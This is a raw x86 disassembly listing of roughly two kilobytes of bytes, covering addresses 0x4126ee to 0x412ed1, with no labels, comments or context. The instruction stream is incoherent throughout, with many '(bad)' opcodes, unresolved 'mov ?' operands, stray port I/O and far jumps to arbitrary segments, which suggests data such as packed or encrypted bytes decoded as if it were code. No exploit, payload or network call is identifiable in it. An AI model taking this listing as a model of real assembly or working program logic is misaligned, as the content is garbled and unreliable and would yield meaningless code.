  4126ee:	scas   eax,DWORD PTR es:[edi]
  4126ef:	fnsave [eax+0x64eef127]
  4126f5:	nop
  4126f6:	jno    0x412725
  4126f8:	out    dx,eax
  4126f9:	enter  0xca1f,0x45
  4126fd:	inc    ebp
  4126fe:	cmp    eax,0x207b7fae
  412703:	les    edx,FWORD PTR [ecx-0x7a]
  412706:	sbb    DWORD PTR [ebp-0x1],ebp
  412709:	mov    ebp,DWORD PTR [ebx]
  41270b:	clc    
  41270c:	sbb    edx,edx
  41270e:	mov    eax,gs:0x6500cb5d
  412714:	pop    ebp
  412715:	je     0x412754
  412717:	dec    esi
  412718:	pop    edi
  412719:	sub    eax,0xca871db9
  41271e:	jmpw   0x5f19
  412722:	mov    eax,0xae62160b
  412727:	dec    eax
  412728:	clc    
  412729:	dec    esp
  41272a:	mov    ebp,0xd6842eaa
  41272f:	xchg   DWORD PTR [ebp+0x43],eax
  412732:	rcl    BYTE PTR [edi+0x26b1eee9],cl
  412738:	push   edx
  412739:	jmp    0xc7d4e7ad
  41273e:	out    dx,eax
  41273f:	leave  
  412740:	mov    ch,0xec
  412742:	faddp  st(0),st
  412744:	es xchg edi,eax
  412746:	jo     0x412744
  412748:	xor    cl,cl
  41274a:	js     0x41278d
  41274c:	dec    ecx
  41274d:	lds    eax,FWORD PTR [esi+0x76d3965e]
  412753:	jge    0x4126f2
  412755:	fmul   QWORD PTR [eiz*4-0x441d93e0]
  41275c:	pop    ss
  41275d:	jmp    0x4127d3
  41275f:	aam    0x8
  412761:	mov    al,ds:0x9dd990c6
  412766:	sub    BYTE PTR [edi+0x6a680538],al
  41276c:	test   eax,0x50b80fed
  412771:	xchg   esi,eax
  412772:	jmp    0xf69f:0x86719d79
  412779:	adc    al,ch
  41277b:	add    DWORD PTR [eax+ebp*2+0x5f1fbf6d],ebx
  412782:	mov    bl,0xcb
  412784:	pop    esi
  412785:	rcl    BYTE PTR [edx+0xc],1
  412788:	mov    WORD PTR [edi],fs
  41278a:	(bad)  
  41278b:	push   ebx
  41278c:	push   0xf39fa007
  412791:	add    bh,0xb
  412794:	jnp    0x4127f1
  412796:	or     BYTE PTR [edx+0x64],ah
  412799:	inc    esi
  41279a:	popf   
  41279b:	xor    ah,cl
  41279d:	jne    0x412731
  41279f:	test   al,0x9b
  4127a1:	mov    edx,0xb4adffe1
  4127a6:	adc    BYTE PTR [eax-0x3],ah
  4127a9:	das    
  4127aa:	jmp    0x5a36:0x75d0e75
  4127b1:	xchg   BYTE PTR [esi],bl
  4127b3:	aam    0x4f
  4127b5:	jle    0x412833
  4127b7:	xchg   edx,eax
  4127b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127b9:	sbb    edi,edi
  4127bb:	mov    ebp,0x5cd4d080
  4127c0:	in     al,0xb9
  4127c2:	fisub  DWORD PTR [esi+0x3e]
  4127c5:	aaa    
  4127c6:	adc    esi,DWORD PTR [edx-0x10ca8fd1]
  4127cc:	lds    edx,FWORD PTR [esi]
  4127ce:	xchg   edi,eax
  4127cf:	jo     0x4127d9
  4127d1:	loop   0x4127ad
  4127d3:	xchg   esi,eax
  4127d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127d5:	push   0x7d
  4127d7:	jnp    0x412774
  4127d9:	daa    
  4127da:	in     eax,0x19
  4127dc:	out    0xe9,eax
  4127de:	aam    0x9
  4127e0:	shr    BYTE PTR [edx+0x12a7deb1],0xfb
  4127e7:	sub    bl,BYTE PTR [edi+0x42]
  4127ea:	aas    
  4127eb:	pusha  
  4127ec:	sub    DWORD PTR [ebp+ebx*8+0x4980a2bc],ebp
  4127f3:	push   0x9
  4127f5:	out    0xff,eax
  4127f7:	mov    al,0x74
  4127fa:	loope  0x41277c
  4127fc:	sub    esp,DWORD PTR [eax]
  4127fe:	and    eax,DWORD PTR [bx]
  412801:	addr16 mov al,0xc1
  412804:	adc    dh,dl
  412806:	and    cl,BYTE PTR [esi+0x414d05f7]
  41280c:	enter  0xceab,0x29
  412810:	mov    ebx,0xd7341f89
  412815:	test   al,0x98
  412817:	js     0x412871
  412819:	clc    
  41281a:	cmp    BYTE PTR [esi+0x5f02fe7e],bl
  412820:	rcr    DWORD PTR [ebx],1
  412822:	in     eax,dx
  412823:	fidivr DWORD PTR [ecx]
  412825:	fmul   DWORD PTR [ebx+0x76]
  412828:	js     0x4127be
  41282a:	out    dx,eax
  41282b:	pop    DWORD PTR [ebp-0xe]
  41282e:	fisttp WORD PTR [edx-0x41]
  412831:	dec    ecx
  412832:	inc    edx
  412833:	into   
  412834:	mov    dh,0x9a
  412836:	enter  0x4a02,0xb
  41283a:	pop    ss
  41283b:	inc    ebp
  41283c:	pop    eax
  41283d:	and    eax,0x30d36bb5
  412842:	mov    esi,0x24f2d39a
  412847:	add    cl,BYTE PTR [ecx*2+0x29c2e142]
  41284e:	or     BYTE PTR [esi+0x761e0da],dl
  412854:	outs   dx,BYTE PTR ds:[esi]
  412855:	inc    ebp
  412856:	xchg   ch,bl
  412858:	lahf   
  412859:	adc    DWORD PTR [ecx+0x58],edi
  41285c:	int    0x71
  41285e:	bound  ecx,QWORD PTR [ebx-0x32eae5e8]
  412864:	mov    DWORD PTR [edi-0x29],ebx
  412867:	push   edx
  412868:	jne    0x412876
  41286a:	dec    esp
  41286b:	mov    edi,0x35b44e7d
  412870:	stos   DWORD PTR es:[edi],eax
  412871:	mov    ah,0xe2
  412873:	loop   0x412811
  412875:	(bad)  
  412877:	jne    0x41282a
  412879:	cmp    bh,BYTE PTR [eax-0x2]
  41287c:	(bad)  [eax+esi*2-0x7a1760e3]
  412883:	pop    ss
  412884:	gs push esp
  412886:	xchg   ecx,eax
  412887:	sbb    al,0xc
  412889:	dec    ecx
  41288a:	sub    al,0xe8
  41288c:	mov    dl,0x8f
  41288e:	cs mov bl,0xbb
  412891:	pop    edx
  412892:	ins    DWORD PTR es:[edi],dx
  412893:	fidivr DWORD PTR [edx-0x58]
  412896:	adc    al,0x59
  412898:	xlat   BYTE PTR ds:[ebx]
  412899:	adc    BYTE PTR [edx],0x7c
  41289c:	sub    BYTE PTR [eax],al
  41289e:	push   esp
  41289f:	(bad)  
  4128a1:	xchg   edi,eax
  4128a2:	adc    ecx,DWORD PTR [edi]
  4128a4:	inc    ebp
  4128a5:	jne    0x41284f
  4128a7:	aas    
  4128a8:	pop    ecx
  4128a9:	test   BYTE PTR [eax],bl
  4128ab:	mov    al,0x43
  4128ad:	jbe    0x41290c
  4128af:	pop    ds
  4128b0:	dec    esi
  4128b1:	sbb    BYTE PTR [eax],al
  4128b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128b4:	mov    ecx,0x2ff62218
  4128b9:	sbb    DWORD PTR [ecx+eax*1+0x1d],eax
  4128bd:	ins    DWORD PTR es:[edi],dx
  4128be:	mov    ebp,0x7667a844
  4128c3:	ss jge 0x41286d
  4128c6:	cmp    cl,BYTE PTR [edi-0x250c3e64]
  4128cc:	xor    edi,DWORD PTR gs:[edx]
  4128cf:	je     0x412941
  4128d1:	fnstenv [ebp-0x718ce7f4]
  4128d7:	sub    DWORD PTR [esi-0x5536b3ea],ebx
  4128dd:	xchg   DWORD PTR [edi-0x74968c74],ebp
  4128e3:	jno    0x4128ab
  4128e5:	xor    dh,BYTE PTR [edx]
  4128e7:	jo     0x4128c8
  4128e9:	add    BYTE PTR [edx+0x53d2e36b],bh
  4128ef:	pop    ebx
  4128f0:	fcmovnb st,st(7)
  4128f2:	mov    esp,0x594a8dfe
  4128f7:	jp     0x41289b
  4128f9:	retf   
  4128fa:	fbld   TBYTE PTR ds:0x3d0b8976
  412900:	pop    es
  412901:	mov    eax,0x43c32c77
  412906:	xchg   ebx,eax
  412907:	movups XMMWORD PTR [ebx-0x6c28eb3b],xmm4
  41290e:	outs   dx,DWORD PTR ds:[esi]
  41290f:	ficomp WORD PTR [eax+0x42]
  412912:	test   BYTE PTR [ebp+0xa038bc3],0xe4
  412919:	jbe    0x4128c4
  41291b:	mov    edx,esi
  41291d:	das    
  41291e:	shl    BYTE PTR [edx+ebp*2+0x33],cl
  412922:	add    edx,eax
  412924:	xor    BYTE PTR [ecx],ah
  412926:	stos   DWORD PTR es:[edi],eax
  412927:	mov    DWORD PTR [eax-0x4c],eax
  41292a:	adc    bh,BYTE PTR [esi+0x48403fd9]
  412930:	pop    ecx
  412931:	and    bl,dl
  412933:	mov    ah,0x97
  412935:	pop    es
  412936:	(bad)  
  412937:	xchg   esp,eax
  412938:	mov    ch,0xc
  41293a:	xchg   esp,eax
  41293b:	xlat   BYTE PTR ds:[ebx]
  41293c:	jl     0x4129b3
  41293e:	repz and ebp,ebp
  412941:	out    dx,al
  412942:	add    al,0xf6
  412944:	sub    ecx,DWORD PTR [eax+eiz*2]
  412947:	mov    ebp,0x3dd80a4
  41294d:	cvtpi2ps xmm5,QWORD PTR [esi+0x32]
  412951:	mov    ?,WORD PTR [edx+0x3c5c2d9e]
  412957:	jmp    0x9e05d78d
  41295c:	xor    ebx,ebp
  41295e:	shl    BYTE PTR gs:[ebp+0x29],0xaa
  412963:	and    BYTE PTR ds:0xa4511296,ah
  412969:	das    
  41296a:	int    0x98
  41296c:	push   0xffffffae
  41296e:	dec    esp
  41296f:	jne    0x4129ab
  412971:	je     0x41290b
  412973:	imul   ebp,DWORD PTR [ecx-0x40],0xaf749ed5
  41297a:	inc    esi
  41297b:	(bad)  ss:[esi-0x5e5cadee]
  412982:	mov    dh,0x9b
  412984:	pop    ss
  412985:	pop    ecx
  412986:	cmc    
  412987:	shr    BYTE PTR [edi],cl
  412989:	stc    
  41298a:	adc    BYTE PTR [ebx-0x2d],dh
  41298d:	pop    ebp
  41298e:	lock pop eax
  412990:	pop    esp
  412991:	mov    ch,0xfd
  412993:	(bad)  
  412994:	fcom   QWORD PTR [eax]
  412996:	xchg   al,al
  412998:	mov    eax,DWORD PTR [edx]
  41299a:	repnz popa 
  41299c:	push   edi
  41299d:	xor    ebp,DWORD PTR [esp+eax*4-0x67febd6d]
  4129a4:	add    BYTE PTR [edi],bh
  4129a6:	adc    DWORD PTR [edi],0xe51f4075
  4129ac:	pop    ecx
  4129ad:	mov    DWORD PTR [ebx+0x1aee4f8d],ecx
  4129b3:	mov    gs,WORD PTR [esp+ebx*4-0x5b]
  4129b7:	icebp  
  4129b8:	pop    edx
  4129b9:	mov    bl,0x20
  4129bb:	add    dh,al
  4129bd:	scas   eax,DWORD PTR es:[edi]
  4129be:	scas   eax,DWORD PTR es:[edi]
  4129bf:	mov    WORD PTR [ecx-0x49bfa116],fs
  4129c5:	repnz inc ecx
  4129c7:	pop    ss
  4129c8:	mov    eax,ds:0xe9831fb1
  4129cd:	in     eax,0xcc
  4129cf:	or     eax,0xece12e53
  4129d4:	add    esi,DWORD PTR [eax]
  4129d6:	jle    0x412a35
  4129d8:	add    DWORD PTR [ebp+eiz*1-0x33],esp
  4129dc:	std    
  4129dd:	pop    ds
  4129de:	jae    0x412a2a
  4129e0:	dec    ebx
  4129e1:	push   eax
  4129e2:	scas   al,BYTE PTR es:[edi]
  4129e3:	adc    ch,BYTE PTR [eax-0x7475df18]
  4129e9:	bswap  eax
  4129eb:	ds addr16 mov edx,cs
  4129ef:	mov    bh,0x6c
  4129f1:	ins    DWORD PTR es:[edi],dx
  4129f2:	fs (bad) 
  4129f5:	shl    ecx,0x95
  4129f8:	mov    ebx,0xcf7788d
  4129fd:	xor    eax,0xf2f4295
  412a02:	aaa    
  412a03:	push   esi
  412a04:	or     ebx,DWORD PTR [ecx+0x67]
  412a07:	jns    0x412a41
  412a09:	repnz fwait
  412a0b:	jp     0x4129b1
  412a0d:	call   0xe459f6f6
  412a12:	jno    0x412a52
  412a14:	pop    edi
  412a15:	(bad)  
  412a16:	adc    al,BYTE PTR [esi-0x5e]
  412a19:	dec    ecx
  412a1a:	ins    BYTE PTR es:[edi],dx
  412a1b:	add    al,0x1b
  412a1d:	scas   al,BYTE PTR es:[edi]
  412a1e:	mov    esi,0xe964225a
  412a23:	cld    
  412a24:	push   eax
  412a25:	sub    cl,bl
  412a27:	xor    BYTE PTR [edx],ah
  412a29:	outs   dx,BYTE PTR ds:[esi]
  412a2a:	fsub   QWORD PTR [ebx]
  412a2c:	stos   BYTE PTR es:[edi],al
  412a2d:	fmul   QWORD PTR [edx-0x46]
  412a30:	mov    al,0xe0
  412a32:	jbe    0x4129cb
  412a34:	gs sub al,0x74
  412a37:	dec    esp
  412a38:	adc    BYTE PTR [edi+0x3ac09eeb],cl
  412a3e:	xor    ch,BYTE PTR ds:0x1654a824
  412a44:	in     eax,dx
  412a45:	mov    cs,WORD PTR [eax+0x7a]
  412a48:	lahf   
  412a49:	adc    ch,BYTE PTR [edi+0x3510186d]
  412a4f:	sti    
  412a50:	add    al,BYTE PTR [ebx]
  412a52:	xchg   esp,eax
  412a53:	inc    ecx
  412a54:	and    eax,0x24a60d0d
  412a59:	inc    esi
  412a5a:	sbb    al,BYTE PTR [esi+0x2eadb3b4]
  412a60:	jmp    0x666b8983
  412a65:	mov    al,ds:0xe5b9ac57
  412a6a:	fisubr WORD PTR [ecx+0x5f99b73a]
  412a70:	test   DWORD PTR [ebx],edi
  412a72:	push   ecx
  412a73:	stc    
  412a74:	xchg   DWORD PTR [edi],ecx
  412a76:	and    ebp,DWORD PTR [ebp-0x4b]
  412a79:	adc    eax,0x5557a903
  412a7e:	or     ebp,DWORD PTR [edi]
  412a80:	xor    BYTE PTR [edi-0x67],ch
  412a83:	fdivr  QWORD PTR [ecx-0x4b]
  412a86:	mov    ah,0x1e
  412a88:	js     0x412aea
  412a8a:	repnz mov al,0x3c
  412a8d:	rcr    BYTE PTR [edx-0x60835bed],0xc
  412a94:	fwait
  412a95:	xchg   ecx,eax
  412a96:	dec    ebx
  412a97:	aam    0xe2
  412a99:	gs (bad) 
  412a9c:	adc    DWORD PTR [esi],ebx
  412a9e:	and    BYTE PTR [ecx],cl
  412aa0:	adc    BYTE PTR [edx],bl
  412aa2:	jo     0x412aea
  412aa4:	and    eax,0x1d239df2
  412aa9:	push   esp
  412aaa:	scas   al,BYTE PTR es:[edi]
  412aab:	push   ecx
  412aac:	mov    WORD PTR [edx-0x5e1f1ebd],gs
  412ab2:	inc    esi
  412ab3:	rcl    ebp,cl
  412ab5:	vandps ymm2,ymm0,ymm3
  412ab9:	call   0x4b7e3052
  412abe:	or     eax,0x292ba924
  412ac3:	mov    ebp,0x5e8cc649
  412ac8:	pop    esi
  412ac9:	fs mov ch,0x6e
  412acc:	sbb    eax,0xa98253a7
  412ad1:	mov    ebp,0x70273556
  412ad6:	int    0xf7
  412ad8:	daa    
  412ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ada:	sbb    al,0x71
  412adc:	daa    
  412add:	push   ebp
  412ade:	or     ebp,edx
  412ae0:	inc    esi
  412ae1:	add    BYTE PTR ss:[esi+0x6b],0x60
  412ae6:	(bad)  
  412ae7:	sub    ebp,DWORD PTR [ebp+0x5a]
  412aea:	inc    ecx
  412aeb:	mov    bh,0x25
  412aed:	jns    0x412b16
  412aef:	cmp    DWORD PTR [eax+0x1182b9c8],ebp
  412af5:	or     al,0x24
  412af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412af8:	adc    DWORD PTR [ebp-0x58],eax
  412afb:	mov    esp,0x8442b2cb
  412b00:	and    ah,dl
  412b02:	xchg   edi,eax
  412b03:	xor    eax,0x254cf667
  412b08:	jmp    0x3d9e67bf
  412b0d:	cmp    al,0xd9
  412b0f:	adc    ah,BYTE PTR [esi+0x49868ca3]
  412b15:	(bad)  
  412b16:	pop    eax
  412b17:	cmp    eax,0x519e80bd
  412b1c:	dec    esp
  412b1d:	cdq    
  412b1e:	dec    ebp
  412b1f:	or     BYTE PTR [ebx-0x22],ch
  412b22:	pop    ss
  412b23:	into   
  412b24:	jp     0x412ab0
  412b26:	or     eax,0xc2a1f4c4
  412b2b:	pop    ebx
  412b2c:	adc    DWORD PTR [ebx],0x36be12a3
  412b32:	cld    
  412b33:	in     al,dx
  412b34:	imul   ebx,DWORD PTR ds:0xd3ba49a5,0x497dd9da
  412b3e:	imul   ebx,DWORD PTR [eax-0x46],0xfcfc6386
  412b45:	(bad)  [ebx+0x82c41ab]
  412b4b:	sub    DWORD PTR [edi],0x63
  412b4e:	push   0xdce9591e
  412b53:	fbstp  TBYTE PTR [ebx+0x6d3203be]
  412b59:	push   esi
  412b5a:	scas   al,BYTE PTR es:[edi]
  412b5b:	imul   ebx,ebx,0x893e398c
  412b61:	data16 jne 0x412ba6
  412b64:	push   ecx
  412b65:	in     al,dx
  412b66:	(bad)  
  412b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b68:	lods   al,BYTE PTR ds:[esi]
  412b69:	outs   dx,BYTE PTR ss:[esi]
  412b6b:	retf   0xee6d
  412b6e:	add    ch,BYTE PTR [ecx+0xc]
  412b71:	cs int 0x49
  412b74:	sub    ah,bl
  412b76:	dec    esi
  412b77:	in     al,0xda
  412b79:	and    DWORD PTR [edx+esi*1],eax
  412b7c:	dec    edx
  412b7d:	xor    eax,0xbc8d9760
  412b82:	imul   edi,esp,0x1930854b
  412b88:	and    BYTE PTR [eax-0x59925855],bl
  412b8e:	push   ds
  412b8f:	ror    BYTE PTR [esi-0x3daf063a],cl
  412b95:	mov    BYTE PTR [ebp-0x3d],ah
  412b98:	mov    dh,0x3e
  412b9a:	(bad)  
  412b9b:	int    0x36
  412b9d:	popa   
  412b9e:	jo     0x412be2
  412ba0:	jmp    0xcedfea54
  412ba5:	mov    ah,0xa
  412ba7:	mov    ebp,0xab1de710
  412bac:	add    edx,DWORD PTR [eax]
  412bae:	les    ebx,FWORD PTR [ebp-0x4178a97d]
  412bb4:	imul   eax,DWORD PTR [esi-0x1055de2e],0xeb09ad9c
  412bbe:	aam    0x55
  412bc0:	iret   
  412bc1:	sub    eax,0xb01813e9
  412bc6:	push   esp
  412bc7:	inc    edx
  412bc8:	clc    
  412bc9:	out    dx,eax
  412bca:	cmpxchg8b QWORD PTR [edx+0xcb8b2f1]
  412bd1:	jmp    0xf935:0x77df5753
  412bd8:	fs jns 0x412b82
  412bdb:	pop    es
  412bdc:	out    dx,al
  412bdd:	xor    eax,0xd4ecd69f
  412be2:	mov    al,0xd
  412be4:	ret    
  412be5:	or     al,BYTE PTR [ebx+0x34]
  412be8:	xor    esp,DWORD PTR [esi+0x32]
  412beb:	idiv   BYTE PTR [eax]
  412bed:	jl     0x412c0a
  412bef:	add    al,0x1e
  412bf2:	xor    esp,ecx
  412bf4:	mov    ebp,0x89d7c334
  412bf9:	add    al,0x6f
  412bfb:	xor    DWORD PTR [ecx-0x2a],esp
  412bfe:	ds push es
  412c00:	xchg   esp,eax
  412c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c02:	or     esp,esp
  412c04:	into   
  412c05:	ins    DWORD PTR es:[edi],dx
  412c06:	pop    ebp
  412c07:	jo     0x412b96
  412c09:	inc    edx
  412c0a:	mov    ss,WORD PTR [edi+ecx*4+0x79]
  412c0e:	ret    
  412c0f:	bound  esp,QWORD PTR [ecx-0x7c03e1db]
  412c15:	adc    al,0x42
  412c17:	je     0x412c0b
  412c19:	push   ebp
  412c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c1b:	cmp    esi,DWORD PTR ds:0x11526062
  412c21:	cld    
  412c22:	adc    edi,DWORD PTR [edi-0x562f7b9f]
  412c28:	(bad)  
  412c2a:	outs   dx,BYTE PTR ds:[esi]
  412c2b:	push   edx
  412c2c:	xchg   dl,dh
  412c2e:	xor    edi,eax
  412c30:	jns    0x412ca3
  412c32:	shr    esp,1
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	clc    
  412c36:	jmp    0x412c68
  412c38:	and    eax,0xa3ff1644
  412c3d:	cmp    al,0x3f
  412c3f:	jnp    0x412c82
  412c41:	aas    
  412c42:	or     al,0x29
  412c44:	push   ss
  412c45:	std    
  412c46:	data16 int 0x89
  412c49:	nop
  412c4a:	loop   0x412cb9
  412c4c:	lock (bad) 
  412c4e:	std    
  412c4f:	push   DWORD PTR [ebp-0x6d]
  412c52:	out    dx,eax
  412c53:	ror    bh,1
  412c55:	lea    ecx,[edi+0x7bdf65ff]
  412c5b:	mov    esp,0x58ae0911
  412c60:	or     BYTE PTR [ebp+0x40],bh
  412c63:	or     BYTE PTR [ecx-0x2f],al
  412c66:	push   edx
  412c67:	fdiv   QWORD PTR fs:[ecx-0x71]
  412c6b:	ins    BYTE PTR es:[edi],dx
  412c6c:	lahf   
  412c6d:	sub    esi,DWORD PTR [esi]
  412c6f:	jns    0x412c41
  412c71:	lods   al,BYTE PTR ds:[esi]
  412c72:	adc    dl,dl
  412c74:	pop    ebp
  412c75:	sub    eax,0xdb00cbe0
  412c7a:	pop    esi
  412c7b:	and    DWORD PTR [ecx+0xe094d69],0xfffffff8
  412c82:	inc    edi
  412c83:	jp     0x412c82
  412c85:	cmp    al,0x3a
  412c87:	imul   ecx,DWORD PTR [esi+0xd],0xf0740fbd
  412c8e:	scas   eax,DWORD PTR es:[edi]
  412c8f:	add    eax,0x21502dae
  412c94:	call   0xdb2919ea
  412c99:	dec    ebp
  412c9a:	loop   0x412d09
  412c9c:	in     eax,dx
  412c9d:	mov    ecx,0xe395970e
  412ca2:	aad    0x65
  412ca4:	xor    al,BYTE PTR ds:0x88fdaa7d
  412caa:	sub    DWORD PTR [esi],edi
  412cac:	clc    
  412cad:	mov    edi,0xc9f3c05b
  412cb2:	fmul   QWORD PTR [edx+0x5d4df178]
  412cb8:	ret    0x7ff1
  412cbb:	mov    ?,WORD PTR [esi]
  412cbd:	add    ebp,DWORD PTR [edi]
  412cbf:	cld    
  412cc0:	retf   
  412cc1:	push   esp
  412cc2:	out    dx,eax
  412cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cc4:	inc    ebx
  412cc5:	pop    edx
  412cc6:	fisubr DWORD PTR [edi-0x6725f6f]
  412ccc:	js     0x412c67
  412cce:	out    0xbd,al
  412cd0:	out    dx,al
  412cd1:	jl     0x412c98
  412cd3:	fidiv  DWORD PTR [edi]
  412cd5:	call   0xb00f:0x7643c23c
  412cdc:	call   FWORD PTR [edi-0x80]
  412cdf:	test   bl,ah
  412ce1:	das    
  412ce2:	inc    ebx
  412ce3:	mov    dl,BYTE PTR [edx+ebp*8]
  412ce6:	cmp    DWORD PTR [edi+0x7],0x49
  412cea:	cld    
  412ceb:	jnp    0x412c7e
  412ced:	ret    0x87bf
  412cf0:	(bad)  
  412cf1:	adc    al,0x36
  412cf3:	mov    WORD PTR [edi],?
  412cf5:	addr16 call 0xe299e4a
  412cfb:	xchg   BYTE PTR [ebx-0x67],al
  412cfe:	push   esi
  412cff:	fild   WORD PTR [edx-0x4c]
  412d02:	xor    eax,0x53ba77ee
  412d07:	xchg   ebx,eax
  412d08:	(bad)  
  412d09:	aad    0x34
  412d0b:	hlt    
  412d0c:	mov    bh,0x40
  412d0e:	cmp    BYTE PTR [edi],0x36
  412d11:	lods   al,BYTE PTR ds:[esi]
  412d12:	adc    ah,BYTE PTR [ebp*8-0x1036258e]
  412d19:	jbe    0x412cae
  412d1b:	fnstenv [edi]
  412d1d:	daa    
  412d1e:	pop    es
  412d1f:	or     al,0xf2
  412d21:	mov    eax,ds:0xc1d4e68f
  412d26:	addr16 out dx,eax
  412d28:	shl    DWORD PTR [ebp+0x7a],cl
  412d2b:	push   ds
  412d2c:	inc    ebx
  412d2d:	popf   
  412d2e:	pop    eax
  412d2f:	jno    0x412d0d
  412d31:	ror    DWORD PTR [eax+0x58],0xd0
  412d35:	(bad)  
  412d36:	dec    ebx
  412d37:	bnd call 0xab2d75b8
  412d3d:	cld    
  412d3e:	ss sbb al,0xbe
  412d41:	mov    ebp,DWORD PTR [eax]
  412d43:	ja     0x412d7c
  412d45:	adc    ebp,DWORD PTR [edi]
  412d47:	mov    bh,0x2a
  412d49:	cmp    eax,0x675eee76
  412d4e:	fst    DWORD PTR [esi*2+0x73eab5d6]
  412d55:	call   0x21f0:0xb95b6abb
  412d5c:	mov    edx,0x42a9ba63
  412d61:	fisub  DWORD PTR [edi]
  412d63:	jmp    0xe23:0x6b340f5d
  412d6a:	mov    dl,0x22
  412d6c:	mov    edx,0xb177179f
  412d71:	pusha  
  412d72:	xor    BYTE PTR [eax+esi*4],dl
  412d75:	or     al,0x7d
  412d77:	xchg   ebp,eax
  412d78:	aas    
  412d79:	leave  
  412d7a:	adc    ch,BYTE PTR [edx-0x7f7c19b8]
  412d80:	scas   eax,DWORD PTR es:[edi]
  412d81:	out    0xd,eax
  412d83:	jbe    0x412d5c
  412d85:	repnz mov ebx,DWORD PTR [eax+ebp*4]
  412d89:	and    eax,0x93f6f284
  412d8e:	cs add bh,ah
  412d91:	outs   dx,DWORD PTR ds:[esi]
  412d92:	inc    ebp
  412d93:	pop    esp
  412d94:	push   esp
  412d95:	retf   
  412d96:	sbb    BYTE PTR [ebp+0x738f2848],bl
  412d9c:	cwde   
  412d9d:	test   eax,0xd0220bc0
  412da2:	xor    bh,BYTE PTR [esi]
  412da4:	int3   
  412da5:	sub    BYTE PTR [edx+0xce9c6d5],0x33
  412dac:	stos   BYTE PTR es:[edi],al
  412dad:	ja     0x412da2
  412daf:	ja     0x412db1
  412db1:	sub    ebx,DWORD PTR [ebx-0x10]
  412db4:	fst    QWORD PTR [edx+ebx*1]
  412db7:	dec    ebx
  412db8:	cwde   
  412db9:	adc    dh,BYTE PTR [ecx-0x1d]
  412dbc:	pop    edx
  412dbd:	sahf   
  412dbe:	in     eax,0xa
  412dc0:	push   ebp
  412dc1:	cmp    BYTE PTR [ebx],0xb2
  412dc4:	jmp    0x412d9a
  412dc6:	and    BYTE PTR [ecx+0x35],bh
  412dc9:	pcmpgtd mm3,QWORD PTR ds:0x2b6417ae
  412dd0:	ret    0x499f
  412dd3:	je     0x412d7e
  412dd5:	pusha  
  412dd6:	jbe    0x412dc1
  412dd8:	sub    ah,cl
  412dda:	push   ebx
  412ddb:	mov    ch,BYTE PTR [eax+0x2ccfc513]
  412de1:	call   0xe1dc:0xbeee76f
  412de8:	fs dec ebx
  412dea:	lds    esi,FWORD PTR [edi]
  412dec:	hlt    
  412ded:	je     0x412d98
  412def:	rol    bh,0x2b
  412df2:	out    dx,eax
  412df3:	adc    bh,BYTE PTR ds:0x47b28ae5
  412df9:	in     eax,dx
  412dfa:	jmp    eax
  412dfc:	out    0x64,al
  412dfe:	into   
  412dff:	pop    ebx
  412e00:	jg     0x412d92
  412e02:	dec    edi
  412e03:	cmc    
  412e04:	loope  0x412e01
  412e06:	mov    cs,edi
  412e08:	mov    edi,0x44342705
  412e0d:	scas   al,BYTE PTR es:[edi]
  412e0e:	mov    BYTE PTR [ebx+0xd5fdf2d],dl
  412e14:	mov    DWORD PTR [ebp+0x507fcf5],esp
  412e1a:	shl    BYTE PTR [edi-0x3546c273],cl
  412e20:	cmp    al,0x17
  412e22:	cmp    edx,esi
  412e24:	test   eax,0x1dde6158
  412e29:	add    al,al
  412e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e2c:	jmp    0x1a3b6445
  412e31:	lods   al,BYTE PTR ds:[esi]
  412e32:	aas    
  412e33:	and    eax,0x8770fb25
  412e38:	ret    0xae3
  412e3b:	mov    edi,0xba40a286
  412e40:	pop    ecx
  412e41:	sub    ebx,DWORD PTR [edi-0x3838a059]
  412e47:	push   ebx
  412e48:	mov    dl,0xf1
  412e4a:	inc    ebp
  412e4b:	sub    dl,0xbd
  412e4e:	inc    edi
  412e4f:	mov    ds:0x254e222a,eax
  412e54:	mov    dl,0x88
  412e56:	loope  0x412de3
  412e58:	out    dx,al
  412e59:	jge    0x412df3
  412e5b:	bound  ebp,QWORD PTR [edi]
  412e5d:	adc    eax,0x7343692
  412e62:	push   cs
  412e63:	(bad)  
  412e64:	push   ds
  412e65:	cld    
  412e66:	call   FWORD PTR [ecx-0x35ccf03b]
  412e6c:	ror    BYTE PTR [edi],cl
  412e6e:	xchg   BYTE PTR [eax+edi*1+0x38],dh
  412e72:	out    dx,eax
  412e73:	mov    esi,esp
  412e75:	or     ebx,esi
  412e77:	and    eax,0x348a3481
  412e7c:	(bad)  
  412e7d:	mov    esi,0xad1ba713
  412e82:	daa    
  412e83:	shl    BYTE PTR [esi-0x2d7fcb6d],cl
  412e89:	cli    
  412e8a:	or     DWORD PTR ds:0xc7a66997,ecx
  412e90:	and    DWORD PTR [ebp-0x24],eax
  412e93:	ss iret 
  412e95:	inc    ecx
  412e96:	in     eax,0xd8
  412e98:	ja     0x412e2d
  412e9a:	inc    ecx
  412e9b:	sub    DWORD PTR [eax+0xccc9865],esi
  412ea1:	mov    edi,DWORD PTR ds:0x492f468
  412ea7:	mov    edx,0xd9bd1bdd
  412eac:	in     eax,0xf2
  412eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eaf:	mov    ebp,esi
  412eb1:	leave  
  412eb2:	leave  
  412eb3:	inc    esp
  412eb4:	lods   al,BYTE PTR ds:[esi]
  412eb5:	xchg   ecx,eax
  412eb6:	out    0xe3,eax
  412eb8:	jg     0x412e50
  412eba:	adc    BYTE PTR [ebx-0x2],bl
  412ebd:	or     BYTE PTR [edi-0x61],dh
  412ec0:	nop
  412ec1:	jp     0x412e75
  412ec3:	cmp    DWORD PTR [eax-0x44],edx
  412ec6:	mov    dh,0x64
  412ec8:	(bad)  
  412ec9:	popf   
  412eca:	test   al,0x24
  412ecc:	in     al,dx
  412ecd:	(bad)  
  412ece:	es push es
  412ed0:	push   cs
  412ed1:	mov    esp,0xc2b5441c
